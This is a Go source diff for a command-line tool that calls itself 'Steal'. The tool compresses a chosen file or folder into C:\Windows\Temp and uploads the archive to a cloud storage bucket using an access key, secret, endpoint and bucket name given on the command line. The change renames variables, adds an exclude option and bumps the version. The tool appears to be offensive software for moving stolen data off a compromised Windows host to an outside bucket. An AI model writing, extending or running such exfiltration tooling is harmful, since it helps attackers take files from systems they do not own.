@@ -13,11 +13,12 @@ import (
 )
 
 var (
-	AccessKeyId     = flag.String("k", "", "AccessKeyId")
-	AccessKeySecret = flag.String("s", "", "AccessKeySecret")
-	Endpoint        = flag.String("e", "", "Endpoint")
+	accessKeyId     = flag.String("k", "", "AccessKeyId")
+	accessKeySecret = flag.String("s", "", "AccessKeySecret")
+	endpoint        = flag.String("e", "", "Endpoint")
 	file            = flag.String("f", "", "local file path")
-	Bucket          = flag.String("b", "", "Bucket")
+	bucket          = flag.String("b", "", "Bucket")
+	exclude         = flag.String("d", "", "Exclude")
 	h               = flag.Bool("h", false, "help")
 )
 
@@ -38,12 +39,12 @@ func main() {
 		dst = "C:\\Windows\\Temp" + "\\" + fileName + "_" + nowTime + ".zip"
 	}
 	fmt.Println("[+] In the compression")
-	if pack.Zip(src, dst) != nil {
+	if pack.Zip(src, dst, *exclude) != nil {
 		fmt.Println("[-] File packing error")
 		os.Exit(-1)
 	}
 	fmt.Println("[+] Packaging complete")
-	if upload.Upload(dst, *AccessKeyId, *AccessKeySecret, *Endpoint, *Bucket) != nil {
+	if upload.Upload(dst, *accessKeyId, *accessKeySecret, *endpoint, *bucket) != nil {
 		fmt.Println("[-] File upload error, please check the input parameter value")
 		os.Exit(-1)
 	}
@@ -61,12 +62,12 @@ func init() {
 	flag.Parse()
 	fmt.Println(Banner)
 	if len(os.Args) <= 4 {
-		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: Steal/0.0.3\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file] [-d Exclude]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
 	if *h == true {
-		fmt.Println("Steal version: Steal/0.0.2\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file]\n\nOptions:\n")
+		fmt.Println("Steal version: Steal/0.0.3\nUsage: Steal [-k AccessKeyId] [-s AccessKeySecret] [-e Endpoint] [-b Bucket] [-f file] [-d Exclude]\n\nOptions:\n")
 		flag.PrintDefaults()
 		os.Exit(0)
 	}
